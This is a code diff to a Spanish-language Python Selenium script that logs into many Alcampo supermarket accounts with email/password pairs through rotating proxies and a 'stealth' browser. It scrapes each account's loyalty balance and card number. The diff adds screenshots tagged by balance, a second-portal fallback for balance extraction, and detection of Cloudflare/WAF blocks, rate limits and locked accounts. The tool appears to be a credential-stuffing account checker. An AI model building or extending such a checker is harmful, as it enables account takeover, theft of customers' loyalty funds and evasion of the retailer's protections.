@@ -13,6 +13,7 @@ import threading
 import builtins
 from pathlib import Path
 from concurrent.futures import ThreadPoolExecutor, as_completed
+from datetime import datetime
 import requests
 
 try:
@@ -127,23 +128,31 @@ def limpiar_saldo(saldo_str):
 
 def extraer_tarjeta(html_content):
     """Extrae el número de tarjeta Alcampo (13 dígitos) desde el código fuente HTML."""
-    if not html_content:
+    if not html_content or not str(html_content).strip():
         return None
     try:
-        # 1. Selector específico de clase Sana Sans / S1 Subtitle de Alcampo
-        m = re.search(r'class="[^"]*(?:sana-sans-alt|s1-subtitle)[^"]*">\s*(\d{13})\s*</span>', html_content)
+        # 1. Canvas o parámetro query clif (?clif=4003009301402)
+        m = re.search(r'[?&]clif=(400\d{10}|280\d{10})', html_content)
         if m:
             return m.group(1).strip()
-        # 2. Búsqueda de prefijo de tarjeta Alcampo 400200 (13 dígitos EAN-13)
-        m = re.search(r'\b(400200\d{7})\b', html_content)
+
+        # 2. Selector específico de clase Sana Sans / S1 Subtitle de Alcampo
+        m = re.search(r'class="[^"]*(?:sana-sans-alt|s1-subtitle)[^"]*">\s*(?:&nbsp;|\s)*(400\d{10}|280\d{10})\s*(?:&nbsp;|\s)*</(?:span|div|p)>', html_content)
         if m:
             return m.group(1).strip()
-        # 3. Cualquier 13 dígitos dentro de span en settings/loyalty
-        m = re.search(r'>\s*(400\d{10}|\d{13})\s*</span>', html_content)
+
+        # 3. Claves JSON en __NEXT_DATA__ o scripts
+        m = re.search(r'"(?:cardNumber|loyaltyCardNumber|barcode|loyaltyNumber)"\s*:\s*"(400\d{10}|280\d{10})"', html_content)
         if m:
             return m.group(1).strip()
-        # 4. Claves JSON en __NEXT_DATA__
-        m = re.search(r'"(?:cardNumber|loyaltyCardNumber|barcode|loyaltyNumber)"\s*:\s*"(\d{13})"', html_content)
+
+        # 4. En elementos HTML delimitados cerrados por etiqueta de cierre o entidad (</tag> o &lt;)
+        m = re.search(r'(?:>|&gt;)\s*(?:&nbsp;|\s)*(400200\d{7}|400300\d{7}|400\d{10}|280\d{10})\s*(?:&nbsp;|\s)*(?:</|&lt;)', html_content)
+        if m:
+            return m.group(1).strip()
+
+        # 5. En texto plano contextualizado por mención de tarjeta / club
+        m = re.search(r'(?:tarjeta|asociad[oa]|club)\D{1,30}\b(400200\d{7}|400300\d{7}|400\d{10}|280\d{10})\b', html_content, re.IGNORECASE)
         if m:
             return m.group(1).strip()
     except Exception:
@@ -190,6 +199,25 @@ def ensure_excel_output(target_path, resultados, assigned_accounts, exit_reason=
         return df
     except Exception as e:
         print(f"⚠️ Error generando Excel de salvaguarda: {e}")
+        return None
+
+
+def capture_screenshot(driver, email, label, screenshot_dir="screenshots"):
+    """Guarda una captura de pantalla fechada para auditoría visual forense."""
+    if not driver:
+        return None
+    try:
+        if not hasattr(driver, "save_screenshot"):
+            return None
+        os.makedirs(screenshot_dir, exist_ok=True)
+        safe_email = re.sub(r'[^a-zA-Z0-9]', '_', str(email) if email else "anon")[:48]
+        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+        shot_path = os.path.join(screenshot_dir, f"{safe_email}_{label}_{ts}.png")
+        driver.save_screenshot(shot_path)
+        print(f"            📸 [CAPTURA GUARDADA] {shot_path}")
+        return shot_path
+    except Exception as e:
+        print(f"            ⚠️ No se pudo guardar captura: {e}")
         return None
 
 # @end: Utilities-And-PII
@@ -1071,23 +1099,128 @@ def _extract_loyalty_balance(driver, timeout_s=10.0):
     return "No encontrado"
 
 
-def _verify_and_hydrate_session(driver, timeout_s=10.0):
-    """Verificación profunda post-login: comprueba hidratación en /settings/loyalty.
-    Si detecta estado 'No encontrado', ejecuta driver.refresh() y re-comprobación en el home
-    para completar el handshake OAuth (máximo 1 reintento)."""
+def _verify_and_hydrate_session(driver, timeout_s=10.0, email=None):
+    """Verificación profunda post-login con arquitectura Dual-Layer (Capa 1 y Capa 2).
+    Capa 1: Comprueba hidratación en /settings/loyalty. Si saldo es positivo limpio, retorna inmediatamente.
+    Capa 2 (Fallback): Si saldo es 0,00 € o no encontrado Y existe data-test='loyalty-manage-button'
+    o aviso de desincronización del microservicio ('settings.loyalty.manage.alternative'),
+    navega al portal maestro (miportal.alcampo.es/es/cuenta/fidelidad) para extraer saldo auténtico y tarjeta.
+    Si Capa 1 es sospechosa sin botón hacia Capa 2, ejecuta driver.refresh() y navegación al home."""
     saldo = _extract_loyalty_balance(driver, timeout_s=timeout_s)
+    page_src = ""
     try:
-        card_num = extraer_tarjeta(driver.page_source)
+        page_src = driver.page_source or ""
     except Exception:
-        card_num = None
+        page_src = ""
 
+    card_num = extraer_tarjeta(page_src)
+    val_saldo = limpiar_saldo(saldo)
+
+    # 1. Éxito limpio en Capa 1: saldo positivo retorna de inmediato sin disparar Capa 2
+    if val_saldo is not None and val_saldo > 0:
+        return saldo, card_num
+
+    # 2. Detección de degradación del microservicio de Capa 1
+    has_manage_btn = 'data-test="loyalty-manage-button"' in page_src
+    has_error_banner = (
+        "settings.loyalty.manage.alternative" in page_src
+        or "no es posible que utilices el saldo" in page_src
+        or "Parece que hay algo que no va bien" in page_src
+    )
+
+    should_fallback_to_capa2 = (
+        (has_manage_btn or has_error_banner)
+        and (val_saldo == 0.0 or saldo == "No encontrado" or "Error" in str(saldo) or val_saldo is None)
+    )
+
+    if should_fallback_to_capa2:
+        print("🔄 [DUAL-LAYER] Capa 1 degradada detectada. Activando Capa 2 (miportal.alcampo.es)...")
+        if email:
+            capture_screenshot(driver, email, "saldo_cero_compraonline")
+
+        # Extraer URL de autorización o enlace directo
+        dest_url = None
+        try:
+            if hasattr(driver, "find_elements"):
+                btns = driver.find_elements(By.CSS_SELECTOR, '[data-test="loyalty-manage-button"]')
+                for b in btns:
+                    h = b.get_attribute("href")
+                    if h:
+                        dest_url = h
+                        break
+        except Exception:
+            pass
+
+        if not dest_url:
+            m_href = re.search(r'data-test=["\']loyalty-manage-button["\'][^>]*href=["\']([^"\']+)["\']', page_src) or \
+                     re.search(r'href=["\']([^"\']+)["\'][^>]*data-test=["\']loyalty-manage-button["\']', page_src)
+            if m_href:
+                dest_url = m_href.group(1).replace("&amp;", "&")
+
+        if not dest_url:
+            dest_url = "https://www.miportal.alcampo.es/es/cuenta/fidelidad"
+
+        # Navegar a Capa 2
+        try:
+            driver.get(dest_url)
+            if email:
+                capture_screenshot(driver, email, "miportal_fallback")
+        except Exception as e_nav:
+            print(f"⚠️ [DUAL-LAYER] Excepción navegando a Capa 2: {e_nav}")
+
+        # Polling dinámico esperando renderizado de 'Saldo disponible' en Capa 2 (hasta 10s)
+        c2_timeout = min(timeout_s, 10.0) if (timeout_s and timeout_s > 0) else 10.0
+        start_c2 = time.time()
+        c2_html = ""
+        c2_saldo = None
+        c2_card = None
+
+        while time.time() - start_c2 < c2_timeout:
+            try:
+                c2_html = driver.page_source or ""
+            except Exception:
+                c2_html = ""
+
+            if "Saldo disponible" in c2_html or "SALDO DISPONIBLE" in c2_html.upper():
+                m_bal = re.search(r"Saldo disponible\s*</span>.*?<span[^>]*>\s*([\d,.]+)\s*(?:&nbsp;|\s)*€\s*</span>", c2_html, re.DOTALL | re.IGNORECASE)
+                if not m_bal:
+                    m_bal = re.search(r"class=[\"'][^\"']*(?:h4-headline|s1-subtitle)[^\"']*[\"'][^>]*>\s*(?:<span>)?\s*([\d,.]+)\s*(?:&nbsp;|\s)*€", c2_html, re.DOTALL | re.IGNORECASE)
+                if not m_bal:
+                    m_bal = re.search(r"Saldo disponible.*?([\d,.]+)\s*(?:&nbsp;|\s)*€", c2_html, re.DOTALL | re.IGNORECASE)
+
+                if m_bal:
+                    raw_val = m_bal.group(1).strip()
+                    c2_saldo = f"Tu Saldo es {raw_val} €"
+                    c2_card = extraer_tarjeta(c2_html)
+                    break
+            time.sleep(0.2)
+
+        if c2_saldo is not None:
+            saldo = c2_saldo
+            card_num = c2_card or extraer_tarjeta(c2_html) or card_num
+            v2 = limpiar_saldo(saldo)
+            if email:
+                capture_screenshot(driver, email, "saldo_positivo" if (v2 is not None and v2 > 0) else "saldo_cero_verificado")
+            print(f"✅ [DUAL-LAYER] Capa 2 resuelta con éxito: {saldo} | Tarjeta: {card_num}")
+            return saldo, card_num
+        else:
+            card_capa2 = extraer_tarjeta(c2_html)
+            if card_capa2:
+                card_num = card_capa2
+
+        return saldo, card_num
+
+    # 3. Flujo estándar Capa 1: si no hay botón a Capa 2 y el estado es sospechoso
     is_suspicious = (
         saldo == "No encontrado"
-        or "Error" in saldo
+        or "Error" in str(saldo)
+        or (val_saldo == 0.0 and card_num is None)
     )
 
     if is_suspicious:
-        print("🔄 [HYDRATION] Saldo no encontrado. Ejecutando driver.refresh() (1 intento)...")
+        if email:
+            capture_screenshot(driver, email, "saldo_no_detectado" if (saldo == "No encontrado" or "Error" in str(saldo)) else "saldo_cero_compraonline")
+        print("🔄 [HYDRATION] Saldo no encontrado o 0,00 € sin tarjeta. Ejecutando driver.refresh() (1 intento)...")
         try:
             driver.refresh()
             time.sleep(2.0)
@@ -1096,7 +1229,8 @@ def _verify_and_hydrate_session(driver, timeout_s=10.0):
         except Exception:
             pass
 
-        if saldo == "No encontrado" or "Error" in saldo:
+        val_after_ref = limpiar_saldo(saldo)
+        if saldo == "No encontrado" or "Error" in str(saldo) or (val_after_ref == 0.0 and card_num is None):
             print("🔄 [HYDRATION] Handshake pendiente. Navegando al home para sincronizar cookies de sesión...")
             try:
                 driver.get("https://www.compraonline.alcampo.es/")
@@ -1118,6 +1252,7 @@ def check_single_account(email, password, scrape_card=True, existing_card_number
     """Logs in and checks the balance (and optionally card number) of a single account.
     Returns: {"status": "success"/"error", "balance": float/None, "card_number": str/None, "error": str/None}"""
     driver = None
+    screenshot_captured = False
     try:
         update_single_check_progress(email, "running", "Iniciando navegador sigiloso...", 20)
         proxy = global_proxy_manager.get_proxy() if global_proxy_manager else None
@@ -1132,8 +1267,18 @@ def check_single_account(email, password, scrape_card=True, existing_card_number
         driver.get(login_url)
         wait = WebDriverWait(driver, 18)
 
-        email_field = wait.until(EC.presence_of_element_located((By.ID, "uname1")))
-        password_field = driver.find_element(By.ID, "pwd1")
+        try:
+            email_field = wait.until(EC.presence_of_element_located((By.ID, "uname1")))
+            password_field = driver.find_element(By.ID, "pwd1")
+        except Exception:
+            p_src = (driver.page_source or "").lower() if driver else ""
+            if any(k in p_src for k in ["cloudflare", "turnstile", "challenge", "429", "waf"]):
+                capture_screenshot(driver, email, "err_waf")
+            else:
+                capture_screenshot(driver, email, "err_inputs")
+            screenshot_captured = True
+            raise
+
         email_field.clear()
         email_field.send_keys(email)
         password_field.clear()
@@ -1152,21 +1297,37 @@ def check_single_account(email, password, scrape_card=True, existing_card_number
             time.sleep(0.25)
 
         if outcome == "pwreset":
+            capture_screenshot(driver, email, "err_needs_attention")
+            screenshot_captured = True
             relogin_ok, relogin_msg = _handle_pwreset_relogin(driver, email, password)
             if relogin_ok:
                 outcome = "logged_in"
                 outcome_msg = ""
+                screenshot_captured = False
             else:
                 outcome = "error"
                 outcome_msg = relogin_msg or "Error: Requiere restablecer contraseña (btnPwReset)"
 
         if outcome != "logged_in":
+            if not screenshot_captured:
+                p_low = (driver.page_source or "").lower() if driver else ""
+                if "call center" in p_low or "bloqueada" in p_low:
+                    capture_screenshot(driver, email, "err_call_center")
+                elif any(k in p_low for k in ["código de verificación", "codigo de verificacion", "btnpwreset", "identity verification"]):
+                    capture_screenshot(driver, email, "err_needs_attention")
+                elif any(k in p_low for k in ["cloudflare", "challenge", "turnstile", "waf", "429 too many"]):
+                    capture_screenshot(driver, email, "err_waf")
+                else:
+                    capture_screenshot(driver, email, "err_oauth_timeout")
+                screenshot_captured = True
             raise Exception(outcome_msg or "Login rechazado o timeout en autorización")
 
         update_single_check_progress(email, "running", "Extrayendo saldo...", 70)
         saldo_str = _extract_loyalty_balance(driver, timeout_s=12.0)
         balance = limpiar_saldo(saldo_str)
         if balance is None:
+            capture_screenshot(driver, email, "saldo_no_detectado")
+            screenshot_captured = True
             raise Exception(f"No se pudo determinar el saldo: {saldo_str}")
 
         card_number = existing_card_number if existing_card_number else None
@@ -1178,6 +1339,14 @@ def check_single_account(email, password, scrape_card=True, existing_card_number
             except Exception:
                 pass
 
+        if balance > 0:
+            capture_screenshot(driver, email, "saldo_positivo")
+        elif card_number:
+            capture_screenshot(driver, email, "saldo_cero_verificado")
+        else:
+            capture_screenshot(driver, email, "saldo_cero_compraonline")
+        screenshot_captured = True
+
         return {
             "status": "success",
             "balance": balance,
@@ -1185,6 +1354,8 @@ def check_single_account(email, password, scrape_card=True, existing_card_number
             "error": None
         }
     except Exception as e:
+        if driver and not screenshot_captured:
+            capture_screenshot(driver, email, "err_unexpected")
         return {
             "status": "error",
             "balance": None,
@@ -1292,9 +1463,23 @@ def _scrape_account_with_driver(driver, init_driver_fn, email, password, label_p
                     cur_u = driver.current_url
                 except Exception:
                     pass
+                p_src = ""
+                try:
+                    p_src = (driver.page_source or "").lower()
+                except Exception:
+                    pass
+                if any(sig in p_src for sig in ["cloudflare", "ray id", "challenge-platform", "access denied", "blocked by cloudflare", "waf", "too many requests"]):
+                    capture_screenshot(driver, email, "err_waf")
+                else:
+                    capture_screenshot(driver, email, "err_inputs")
                 raise Exception(f"Timeout esperando #uname1 en URL={cur_u[:90]}") from wait_err
 
-            password_field = driver.find_element(By.ID, "pwd1")
+            try:
+                password_field = driver.find_element(By.ID, "pwd1")
+            except Exception as pwd_err:
+                capture_screenshot(driver, email, "err_inputs")
+                raise Exception("Campo #pwd1 no encontrado en el DOM") from pwd_err
+
             email_field.clear()
             email_field.send_keys(email)
             password_field.clear()
@@ -1311,6 +1496,7 @@ def _scrape_account_with_driver(driver, init_driver_fn, email, password, label_p
                 time.sleep(0.25)
 
             if outcome == "pwreset":
+                capture_screenshot(driver, email, "err_needs_attention")
                 relogin_ok, relogin_msg = _handle_pwreset_relogin(driver, email, password)
                 if relogin_ok:
                     outcome = "logged_in"
@@ -1362,6 +1548,17 @@ def _scrape_account_with_driver(driver, init_driver_fn, email, password, label_p
                 err_type, reason = circuit_breaker.classify_error(page_source=page_html, error_msg=saldo)
                 print(f"{label_prefix} 🔴 {mask_email(email)} → {saldo} [{err_type}] (login={t_login:.2f}s)")
 
+                if "call center" in page_html_low or "cuenta ha sido bloqueada" in page_html_low or "call center" in saldo.lower():
+                    capture_screenshot(driver, email, "err_call_center")
+                elif any(k in page_html_low for k in ["código de verificación", "codigo de verificacion", "identity verification", "device activation", "btnpwreset", "restablecer"]):
+                    capture_screenshot(driver, email, "err_needs_attention")
+                elif err_type == "ip_error" or any(k in page_html_low for k in ["cloudflare", "ray id", "challenge-platform", "access denied", "blocked by cloudflare", "waf", "too many requests"]):
+                    capture_screenshot(driver, email, "err_waf")
+                elif "timeout" in saldo.lower() or "no redirigidas" in saldo.lower() or outcome == "pending":
+                    capture_screenshot(driver, email, "err_oauth_timeout")
+                else:
+                    capture_screenshot(driver, email, f"err_{err_type}")
+
                 if err_type in ("account_error", "needs_attention"):
                     break
                 if intento < intentos_max:
@@ -1372,7 +1569,7 @@ def _scrape_account_with_driver(driver, init_driver_fn, email, password, label_p
 
             # Logged in: extract loyalty balance and card number with deep hydration check
             t_loy0 = time.time()
-            saldo, card_number = _verify_and_hydrate_session(driver, timeout_s=10.0)
+            saldo, card_number = _verify_and_hydrate_session(driver, timeout_s=10.0, email=email)
             t_loyalty += time.time() - t_loy0
 
             val_num = limpiar_saldo(saldo)
@@ -1383,10 +1580,18 @@ def _scrape_account_with_driver(driver, init_driver_fn, email, password, label_p
                     f"{label_prefix} ✔ {mask_email(email)} → {saldo} | TARJETA: {card_number or 'N/A'} "
                     f"(total={total_s:.2f}s | login={t_login:.2f}s | saldo={t_loyalty:.2f}s)"
                 )
+                if val_num > 0:
+                    capture_screenshot(driver, email, "saldo_positivo")
+                else:
+                    if card_number:
+                        capture_screenshot(driver, email, "saldo_cero_verificado")
+                    else:
+                        capture_screenshot(driver, email, "saldo_cero_compraonline")
                 break
             else:
                 saldo = "Error: Saldo no hidratado en DOM"
                 err_type = "session_error"
+                capture_screenshot(driver, email, "saldo_no_detectado")
                 if intento < intentos_max:
                     continue
 
@@ -1394,6 +1599,7 @@ def _scrape_account_with_driver(driver, init_driver_fn, email, password, label_p
             err_str = str(e).splitlines()[0] if str(e) else "Excepción WebDriver"
             print(f"{label_prefix} ❌ Error en {mask_email(email)} (Intento {intento}/{intentos_max}): {err_str}")
             if driver:
+                capture_screenshot(driver, email, "err_unexpected")
                 try:
                     driver.quit()
                 except Exception:
